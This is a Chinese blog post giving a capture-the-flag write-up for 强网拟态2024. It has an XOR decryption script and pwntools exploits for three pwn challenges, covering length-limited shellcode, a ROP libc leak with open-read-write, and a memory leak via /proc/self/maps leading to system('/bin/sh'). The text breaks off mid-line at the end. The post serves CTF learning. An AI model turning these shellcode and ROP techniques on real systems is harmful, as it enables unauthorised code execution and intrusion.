---
title: 强网拟态2024 wp - 渗透测试中心
url: https://www.cnblogs.com/backlion/p/18513815
source: 博客园 - 渗透测试中心
date: 2024-10-30
fetch_date: 2025-10-06T18:52:05.477909
---

# 强网拟态2024 wp - 渗透测试中心

[![](https://img2024.cnblogs.com/blog/35695/202509/35695-20250929100304557-587378723.jpg)](https://qoder.com/)

* [![博客园logo](//assets.cnblogs.com/logo.svg)](https://www.cnblogs.com/ "开发者的网上家园")
* [会员](https://cnblogs.vip/)
* [众包](https://www.cnblogs.com/cmt/p/18500368)
* [新闻](https://news.cnblogs.com/)
* [博问](https://q.cnblogs.com/)
* [闪存](https://ing.cnblogs.com/)
* [赞助商](https://www.cnblogs.com/cmt/p/19081960)
* [HarmonyOS](https://harmonyos.cnblogs.com/)
* [Chat2DB](https://chat2db-ai.com/)

* ![搜索](//assets.cnblogs.com/icons/search.svg)
  ![搜索](//assets.cnblogs.com/icons/enter.svg)
  + ![搜索](//assets.cnblogs.com/icons/search.svg)

    所有博客
  + ![搜索](//assets.cnblogs.com/icons/search.svg)

    当前博客
* [![写随笔](//assets.cnblogs.com/icons/newpost.svg)](https://i.cnblogs.com/EditPosts.aspx?opt=1 "写随笔")
  [![我的博客](//assets.cnblogs.com/icons/myblog.svg)](https://passport.cnblogs.com/GetBlogApplyStatus.aspx "我的博客")
  [![短消息](//assets.cnblogs.com/icons/message.svg)](https://msg.cnblogs.com/ "短消息")
  ![简洁模式](//assets.cnblogs.com/icons/lite-mode-on.svg)

  [![用户头像](//assets.cnblogs.com/icons/avatar-default.svg)](https://home.cnblogs.com/)

  [我的博客](https://passport.cnblogs.com/GetBlogApplyStatus.aspx)
  [我的园子](https://home.cnblogs.com/)
  [账号设置](https://account.cnblogs.com/settings/account)
  [会员中心](https://vip.cnblogs.com/my)
  简洁模式 ...
  退出登录

  [注册](https://account.cnblogs.com/signup)
  登录

[![返回主页](/skins/custom/images/logo.gif)](https://www.cnblogs.com/backlion/)

# [渗透测试中心](https://www.cnblogs.com/backlion)

##

* [博客园](https://www.cnblogs.com/)
* [首页](https://www.cnblogs.com/backlion/)
* [新随笔](https://i.cnblogs.com/EditPosts.aspx?opt=1)
* [联系](https://msg.cnblogs.com/send/%E6%B8%97%E9%80%8F%E6%B5%8B%E8%AF%95%E4%B8%AD%E5%BF%83)
* [管理](https://i.cnblogs.com/)
* 订阅
  [![订阅](/skins/coffee/images/xml.gif)](https://www.cnblogs.com/backlion/rss/)

# [强网拟态2024 wp](https://www.cnblogs.com/backlion/p/18513815 "发布于 2024-10-29 16:47")

## Crypto

### XOR

1.打开环境是一串字符，用一个异或脚本或者在线解码工具就可以解出来(只有一次加密)

key是[mimic](https://so.csdn.net/so/search?q=mimic&spm=1001.2101.3001.7020)

![](https://img2023.cnblogs.com/blog/1049983/202410/1049983-20241029164627323-1145494508.png)

解密得到flag

在线解密

![](https://img2023.cnblogs.com/blog/1049983/202410/1049983-20241029164628107-1809459042.png)

或者脚本：

```
# 密文
```

```
ciphertext = "0b050c0e180e585f5c52555c5544545c0a0f44535f0f5e445658595844050f5d0f0f55590c555e5a0914"
```

```
# 将十六进制字符串转换为字节
```

```
ciphertext_bytes = bytes.fromhex(ciphertext)
```

```
# 假设密钥为 'Key'，可以根据需要更改密钥
```

```
key = b'mimic'
```

```
# 对密文进行异或解密
```

```
plaintext_bytes = bytes([a ^ b for a, b in zip(ciphertext_bytes, key * (len(ciphertext_bytes) // len(key) + 1))])
```

```
# 将解密后的字节转换为字符串
```

```
plaintext = plaintext_bytes.decode('utf-8')
```

```
print(plaintext)
```

```

```

```
![](https://img2023.cnblogs.com/blog/1049983/202410/1049983-20241029164628741-2140565532.jpg)
```

## Pwn

### ezcode

套json的直接shellcode，限制长度0x16，先实现0x16字节内的mprotect+read，后续写orw\_shellcode

```
from pwn import *
import json
context(log_level='debug',os='linux',arch='amd64')
pwnfile = './vuln'
io=process(pwnfile)
#io = remote()
elf = ELF(pwnfile)
libc = ELF("/lib/x86_64-linux-gnu/libc.so.6")
#libc = ELF("./libc.so.6")

shellcode='''
sal edi,12
mov dx,7
mov ax,10
syscall

cdq
xor eax,eax
mov esi,ecx
xor edi,edi
syscall
'''

shellcode1 = asm(shellcode)
print("len-->",len(shellcode1))
payload1 = {
    "shellcode": shellcode1.hex()
}

io.sendlineafter("Please enter your input:",json.dumps(payload1))

shellcode = asm('''
    mov rdi,0x999800d
    xor esi,esi
    xor rdx,rdx
    mov rax,2
    syscall

    mov rdi,rax
    mov rsi,0x9998000+0x300
    mov edx,0x40
    xor eax,eax
    syscall

    mov edi,1
    mov rsi,0x9998000+0x300
    mov rax,1
    syscall
    ''')

io.sendline(b'./flag\x00\x00\x00'+shellcode)

io.interactive()
```

### signin\_revenge

栈溢出，no pie， no canary，构造ROP 泄露地址然后orw

```
from pwn import *
context(log_level='debug',os='linux',arch='amd64')
pwnfile = './vuln'
#io=process(pwnfile)

io=remote("pwn-16255a8951.challenge.xctf.org.cn", 9999, ssl=True)
elf = ELF(pwnfile)
libc = ELF("./libc.so.6")

def debug():
    gdb.attach(io)
    pause()

pop_rdi = 0x0000000000401393

puts_got = elf.got['puts']
puts_plt = elf.plt['puts']
main_adr = elf.symbols['main']
#debug()
pay = b'a'*0x108+flat(pop_rdi,puts_got,puts_plt,main_adr)

io.sendlineafter("lets move and pwn!\n",pay)

puts_adr = u64(io.recvuntil("\x7f")[-6:].ljust(8,b'\x00'))
libc_base = puts_adr-libc.sym['puts']

pop_rdx = libc_base + 0x0000000000142c92
pop_rsi = libc_base + 0x000000000002601f
pop_rbp = libc_base + 0x00000000000226c0
pop_rax = libc_base + 0x0000000000036174
leave_ret = 0x4012EE
read = 0x04012D6   #0x130
bss = 0x404000+0x800
flag_adr= bss+0x98

op = libc_base + libc.symbols['open']
re = libc_base + libc.symbols['read']
wr = libc_base + libc.symbols['write']

pay = b'a'*0x100+p64(bss-8)+flat(pop_rax,bss,read)
io.sendafter("lets move and pwn!\n",pay)
#debug()
orw = flat(pop_rdi,flag_adr,pop_rsi,0,op,
pop_rdi,3,pop_rsi,flag_adr+0x200,pop_rdx,0x100,re,
pop_rdi,1,pop_rsi,flag_adr+0x200,pop_rdx,0x40,wr)+b'./flag\x00'

io.sendline(orw)

io.interactive()
```

### QWEN

![2b3cf38193ce3750b491914d11006e83](https://img2023.cnblogs.com/blog/1049983/202410/1049983-20241029164629549-989178266.png)

可以越界写到 memu 指针，和 0x20 字节。

然后是利用 后门 读 /proc/self/maps 获取内存信息，通过 libc\_base 拿到两个 gadget

0x000000000004ee21 : pop rdx ; add rsp, 0x38 ; pop rbx ; pop rbp ; ret

0x00000000000d10be : xor eax, eax ; add rsp, 8 ; ret

劫持 menu 指针为 pop rdx ; add rsp, 0x38 ; pop rbx ; pop rbp ; ret，跳到 read 多写的 0x20 字节，执行 system(“/bin/sh”) 获取 shell

exp

```
from pwn import *

def debug(c = 0):
    if(c):
        gdb.attach(p, c)
    else:
        gdb.attach(p)
        pause()
def get_sb() : return libc_base + libc.sym['system'], libc_base + next(libc.search(b'/bin/sh\x00'))
#-----------------------------------------------------------------------------------------
s = lambda data : p.send(data)
sa  = lambda text,data  :p.sendafter(text, data)
sl  = lambda data   :p.sendline(data)
sla = lambda text,data  :p.sendlineafter(text, data)
r   = lambda num=4096   :p.recv(num)
rl  = lambda text   :p.recvuntil(text)
pr = lambda num=4096 :print(p.recv(num))
inter   = lambda        :p.interactive()
l32 = lambda    :u32(p.recvuntil(b'\xf7')[-4:].ljust(4,b'\x00'))
l64 = lambda    :u64(p.recvuntil(b'\x7f')[-6:].ljust(8,b'\x00'))
uu32    = lambda    :u32(p.recv(4).ljust(4,b'\x00'))
uu64    = lambda    :u64(p.recv(6).ljust(8,b'\x00'))
int16   = lambda data   :int(data,16)
lg= lambda s, num   :p.success('%s -> 0x%x' % (s, num))
#-----------------------------------------------------------------------------------------

context(os='linux', arch='amd64', log_level='debug')
p = remote("pwn-bc7e9f0275.challenge.xctf.org.cn", 9999, ssl=True)
#p = process('pwn1')
elf = ELF('pwn1')
libc = ELF('libc.so.6')

#debug('b *$rebase(0x1022)\n')

for i in range(5):
    sla(b'\xbc\x89\xef\xbc\x9a', str(i) + ' 0')

pl = b'a'*0x8 + p16(0x1508)
sa(b'say?', pl)

sla(b'game [Y/N]', b'N')

sla(b'\xbc\x89\xef\xbc\x9a', '111 111')

sla(b'administrator key\n', str(0x6b8b4567))

file_name = b'/proc/self/maps'

sla(b'logged in!\n', file_name)

rl(b'The debugging information is as follows >>\n')
pro_base = int(r(12), 16)
rl(b'libc.so.6\n')
libc_base = int(r(12), 16) - 0x1e7000
lg('pro_base', pro_base)
lg('libc_base', libc_base)

for i in range(5):
    sla(b'\xbc\x89\xef\xbc\x9a', str(i) + ' 0')

# 0x000000000004ee21 : pop rdx ; add rsp, 0x38 ; pop rbx ; pop rbp ; ret
# 0x00000000000d10be : xor eax, eax ; add rsp, 8 ; ret
rdi = libc_base + 0x000000000002164f
system, binsh = get_sb()
ret = libc_base + 0x00000000000008aa

one_gadget = libc_base + 0x000000000004ee21
pl = p64(libc_base + 0x00000000000d10be) + p64(one_gadget) + p64(ret) + p64(rdi) + p64(binsh) + p64(system)

sa(b'say?', pl)
sla(b'game [Y/N]', b'N')
sla(b'\xbc\x89\xef\xbc\x9a', '111 111111111111111111111')

lg('pro_base', pro_bas...